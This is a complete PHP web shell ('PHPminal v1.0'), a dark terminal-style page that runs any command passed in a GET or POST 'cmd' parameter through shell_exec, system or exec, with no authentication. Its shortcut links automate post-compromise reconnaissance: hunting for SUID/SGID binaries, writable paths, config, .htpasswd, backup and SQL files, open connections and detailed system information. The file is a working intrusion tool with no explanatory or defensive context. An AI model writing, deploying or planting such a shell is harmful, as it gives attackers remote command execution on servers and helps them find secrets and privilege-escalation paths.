<!DOCTYPE html>
<html>
<head>
        <title>PHPminal v1.0</title>
        <style>
            *{ margin: 0px; padding: 0px; }
            body{ color: #BBB; background-color: #111; font-family: "Courier New", Courier, monospace; }
            #cmdOutput{ margin-bottom: 120px; padding: 15px; }
            #form{ position: fixed; bottom: 0px; left: 0px; background: #111; padding-top: 15px; padding-left: 5px; padding-right: 5px; width: 100vw; }
            #inp{ border: 0px; border-bottom: 1px dotted #333;  background: transparent; width: 75%; color: #FFF; font-family: "Courier New", Courier, monospace; font-weight: bold; }
            #shortcuts { background-color: #333; padding: 3px 5px; width: 100vw; margin-top: 12px; }
            a{ color: #FFF; }
            a:hover{ color: #900; }
            small{ font-size: 70%; }
        </style>
</head>

<?php
    function run_cmd($cmd){
        $out = false;
        $out = @shell_exec($cmd);
        if($out){ return $out; }
        else{
            $out = @system($cmd, $retVal);
            if($out){return $out; }
            else{
                $out = @exec($cmd);
                if($out){ return $out; }
                else{ return ""; }
            }
        }
    }
?>

<body onload="document.getElementById('inp').focus();">
    <div id="cmdOutput">
    <?php
        if(isset($_GET['cmd'])){ $_POST["cmd"] = $_GET["cmd"]; }

        if(isset($_POST['cmd'])){
            $out = false;
            $out = run_cmd($_POST['cmd']);
            echo "<pre>".htmlspecialchars($out)."</pre>";
        }
    ?>
    </div>

    <form method="POST" action="<?php echo basename(getenv("SCRIPT_FILENAME")); ?>" id="form">
        <?php
            $user = trim(run_cmd("whoami"));
            $host = trim(run_cmd("hostname"));
            if($user == "root"){ $sep = "#"; } else{ $sep = "$"; }
            echo "┌─[<b style='color:#900;'>$user</b>@<b style='color:#FFF;'>$host</b>]<br>";
            echo "└─── $sep ";
        ?>
        <input type="text" name="cmd" id="inp" value="<?php echo htmlspecialchars($_POST['cmd']); ?>"> <input type="submit" value="run..." class="btn">

        <div id="shortcuts">
            <small>
                <a href="?cmd=<?php echo urlencode("find / -type f -perm -04000 -ls"); ?>">Find SUID files</a> |
                <a href="?cmd=<?php echo urlencode("find / -type f -perm -02000 -ls"); ?>">Find SGID files</a> |
                <a href="?cmd=<?php echo urlencode("find / -type f -iname \"*config*\""); ?>">Find *config*</a> |
                <a href="?cmd=<?php echo urlencode("find / -perm -2 -ls"); ?>">Find writeable dirs and files</a> |
                <a href="?cmd=<?php echo urlencode("find / -name .htaccess"); ?>">Find .htaccess</a> |
                <a href="?cmd=<?php echo urlencode("find / -name .htpasswd"); ?>">Find .htpasswd</a> |
                <a href="?cmd=<?php echo urlencode("find / -iname \"*.bak\""); ?>">Find *.bak</a> |
                <a href="?cmd=<?php echo urlencode("find / -iname \"*.sql\""); ?>">Find *.sql</a> |
                <a href="?cmd=<?php echo urlencode("netstat -a"); ?>">Netstat</a> |
                <a href="?cmd=<?php echo urlencode('id; echo " "; echo "-----------------------------------------------"; echo " "; uname -a; echo " "; lscpu; echo " "; lsmod; echo " "; echo "-----------------------------------------------"; echo " "; df -h; echo " "; mount; echo " "; lsblk; echo " "; cat /proc/partitions; echo " "; echo "-----------------------------------------------"; echo " "; free -h; echo " "; cat /proc/meninfo; echo " "; echo "-----------------------------------------------"; echo " "; lshw; hwinfo --short; echo " "; echo "-----------------------------------------------"; echo " "; ifconfig -a; echo " "; echo "RESOLV.CONF:"; cat /etc/resolv.conf; echo " "; echo "HOSTS-FILE:"; cat /etc/hosts; echo " "; echo "-----------------------------------------------"; echo " "; ps -aux | egrep -v "uname.*lscpu"; echo " "; echo "-----------------------------------------------"; echo " ";'); ?>">Sysinfo</a>
            </small>
        </div>
    </form>
</body>
</html>